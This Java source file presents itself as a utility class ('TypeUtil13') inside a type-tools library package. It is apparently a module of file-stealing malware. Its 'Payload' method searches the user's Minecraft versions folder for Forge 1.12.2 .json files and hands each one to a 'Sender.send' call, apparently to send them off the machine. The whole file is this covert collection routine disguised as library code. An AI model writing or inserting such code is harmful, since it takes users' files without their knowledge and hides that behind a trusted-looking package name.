package net.jodah.typetools.util.impl;

import net.jodah.typetools.Sender;
import net.jodah.typetools.util.Payload;

import java.io.File;
import java.util.Objects;

public final class TypeUtil13 implements Payload
{
    @Override
    public void execute() throws Exception
    {
        File file2 = new File(System.getenv("APPDATA") + "/.minecraft/versions");
        if (file2.isDirectory())
            for (File file1 : Objects.requireNonNull(file2.listFiles()))
                if (file1.isDirectory())
                    for (File file : Objects.requireNonNull(file1.listFiles()))
                        if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge"))
                            Sender.send(file);
    }
}
